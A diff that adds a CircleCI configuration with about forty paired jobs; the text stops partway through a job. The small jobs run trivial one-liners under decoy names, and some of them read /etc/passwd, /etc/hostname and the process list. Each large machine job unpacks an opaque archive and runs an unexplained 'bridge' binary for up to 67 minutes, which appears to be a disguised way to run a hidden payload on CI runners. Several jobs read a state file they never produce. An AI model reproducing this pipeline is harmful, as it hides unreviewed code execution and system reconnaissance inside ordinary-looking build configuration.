@@ -1,0 +1,1611 @@
+version: 2.1
+
+jobs:
+  audit_add-queue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: steam iron
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "x\\x00y\\x00z" | tr -d '\0' | wc -c; true ; } > /tmp/pipeline/passoff.ok
+            echo "gate add-queue: $(wc -c </tmp/pipeline/passoff.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - passoff.ok
+  add-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/passoff.ok
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  bundle_PROD_VERIFY_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: annoy manager
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; date +%s; true ; } > /tmp/pipeline/log.ndjson
+            echo "gate PROD_VERIFY_6: $(wc -c </tmp/pipeline/log.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.ndjson
+  PROD_VERIFY_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/log.ndjson
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  ctx2_check-end-to-end-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: warp drive
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; date -u +"%H:%M:%S.%N"; true ; } > /tmp/pipeline/.done
+            echo "gate check-end-to-end-regression-suite: $(wc -c </tmp/pipeline/.done) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .done
+  check-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/.done
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  p2_titan-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: side quest
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/pipeline/relay.state
+            echo "gate titan-ng: $(wc -c </tmp/pipeline/relay.state) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - relay.state
+  titan-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  phase_DATA-994:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: potluck
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; sed 's/:/|/g' /etc/passwd | head -3; true ; } > /tmp/pipeline/step-20.txt
+            echo "gate DATA-994: $(wc -c </tmp/pipeline/step-20.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-20.txt
+  DATA-994:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  postcheck_CHECK_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: tornado alley
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=2;i<=200;i++){isp=1;for(j=2;j*j<=i;j++)if(i%j==0){isp=0;break}; if(isp)c++} print c}'; true ; } > /tmp/pipeline/handoff.ok
+            echo "gate CHECK_LAB: $(wc -c </tmp/pipeline/handoff.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.ok
+  CHECK_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/handoff.ok
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  precheck_edge-v9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: in front
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=8;i++){for(j=1;j<=i;j++)printf "*"; print ""}}'; true ; } > /tmp/pipeline/checkpoint-B.pt
+            echo "gate edge-v9: $(wc -c </tmp/pipeline/checkpoint-B.pt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - checkpoint-B.pt
+  edge-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/checkpoint-B.pt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  p1_v5-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: to windward
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abc"; sub("b","B",s); print s}'; true ; } > /tmp/pipeline/handover.txt
+            echo "gate v5-beta: $(wc -c </tmp/pipeline/handover.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handover.txt
+  v5-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/handover.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  precheck_fix-dashboard-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: diminuendo
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tar -cf - /etc/hostname 2>/dev/null | wc -c; true ; } > /tmp/pipeline/cache.dat
+            echo "gate fix-dashboard-redirect: $(wc -c </tmp/pipeline/cache.dat) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.dat
+  fix-dashboard-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/cache.dat
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  package_node20-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: grep
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ps -eo comm 2>/dev/null | sort | uniq | head -10; true ; } > /tmp/pipeline/log.txt
+            echo "gate node20-bench: $(wc -c </tmp/pipeline/log.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.txt
+  node20-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/log.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  g2_uma-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: quick glance
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("red,green,blue",a,","); for(i in a) print a[i]}' | sort; true ; } > /tmp/pipeline/.ready
+            echo "gate uma-ship: $(wc -c </tmp/pipeline/.ready) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .ready
+  uma-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  tap_DEPLOY_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: nth retry
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "x %s\n" red green blue; true ; } > /tmp/pipeline/.pid
+            echo "gate DEPLOY_UAT: $(wc -c </tmp/pipeline/.pid) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .pid
+  DEPLOY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  compile_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nova spark
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 167125 | awk 'NR>10211 && NR<57694{s+=$1}END{print s}'; true ; } > /tmp/pipeline/checkpoint-main.pt
+            echo "gate spin-up: $(wc -c </tmp/pipeline/checkpoint-main.pt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - checkpoint-main.pt
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/checkpoint-main.pt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  hydrate_fix-oauth-hang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: splits down
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<10;a++) for(b=a+1;b<=10;b++) for(c=b+1;c<=10;c++) if(a*a+b*b==c*c) print a","b","c}' | wc -l; true ; } > /tmp/pipeline/ckpt-E.pkl
+            echo "gate fix-oauth-hang: $(wc -c </tmp/pipeline/ckpt-E.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - ckpt-E.pkl
+  fix-oauth-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/ckpt-E.pkl
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  phase1_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: spiderweb catch
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/pipeline/log.log
+            echo "gate canary: $(wc -c </tmp/pipeline/log.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.log
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/log.log
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  env_ShipService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: soak cycle
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -c 'a-z\n' 'X' < /etc/hostname | head -c 50; true ; } > /tmp/pipeline/primary_task_output.log
+            echo "gate ShipService: $(wc -c </tmp/pipeline/primary_task_output.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - primary_task_output.log
+  ShipService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  hook_rm-router-v2-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: planche
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if($1<50) a+=$1; else b+=$1}END{print a, b}'; true ; } > /tmp/pipeline/full_phase_output_v3.out
+            echo "gate rm-router-v2-glitch: $(wc -c </tmp/pipeline/full_phase_output_v3.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - full_phase_output_v3.out
+  rm-router-v2-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  reset_edge-v1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: oncall ping
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "%'d\n" 1234567 2>/dev/null || printf "%d\n" 1234567; true ; } > /tmp/pipeline/2024-02-03.data
+            echo "gate edge-v1: $(wc -c </tmp/pipeline/2024-02-03.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-02-03.data
+  edge-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  Alpha_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pine resin
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=1024; while(n>1){n/=2;c++}; print c}'; true ; } > /tmp/pipeline/big_phase_output.out
+            echo "gate go-live: $(wc -c </tmp/pipeline/big_phase_output.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - big_phase_output.out
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/big_phase_output.out
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  cleanup_d-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: shrug up
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; grep -F "test" <<<$'this is a test\nnothing here\ntest again'; true ; } > /tmp/pipeline/event.ndjson
+            echo "gate d-new: $(wc -c </tmp/pipeline/event.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - event.ndjson
+  d-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  fetch_run-partial-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: plate soft
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="Hello"; n=length(s); for(i=0;i<n;i++)printf "%d ", 1+(index(toupper(s),substr(toupper(s),i+1,1))%26); print ""}'; true ; } > /tmp/pipeline/DONE
+            echo "gate run-partial-docker-image: $(wc -c </tmp/pipeline/DONE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - DONE
+  run-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  redo_helios-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: scherzo
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk -F: '$3>1000 && $3<2000' /etc/passwd | wc -l; true ; } > /tmp/pipeline/69.log
+            echo "gate helios-final: $(wc -c </tmp/pipeline/69.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 69.log
+  helios-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/69.log
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  canary_titan2-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: blend edges
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; test 5 -gt 3 && echo gt-ok; true ; } > /tmp/pipeline/timings.json
+            echo "gate titan2-plus: $(wc -c </tmp/pipeline/timings.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - timings.json
+  titan2-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/timings.json
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  spinner_fix-retry-timeout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: charleston kick
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..100} | awk '{s+=$1}END{print s}'; true ; } > /tmp/pipeline/.sig
+            echo "gate fix-retry-timeout: $(wc -c </tmp/pipeline/.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .sig
+  fix-retry-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  drain_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: arc welder
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes abc | head -n 234225 | sha256sum; true ; } > /tmp/pipeline/.marker
+            echo "gate fire-up: $(wc -c </tmp/pipeline/.marker) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .marker
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/.marker
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  canary1_check-staging-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: to leeward
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print substr(s,2,3)}'; true ; } > /tmp/pipeline/2023-10-04.data
+            echo "gate check-staging-release-candidate: $(wc -c </tmp/pipeline/2023-10-04.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-10-04.data
+  check-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/2023-10-04.data
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  bake_cf-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: whats this
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; touch /tmp/_t && stat -c %U:%G /tmp/_t 2>/dev/null && rm /tmp/_t; true ; } > /tmp/pipeline/step-ok.txt
+            echo "gate cf-v2: $(wc -c </tmp/pipeline/step-ok.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-ok.txt
+  cf-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
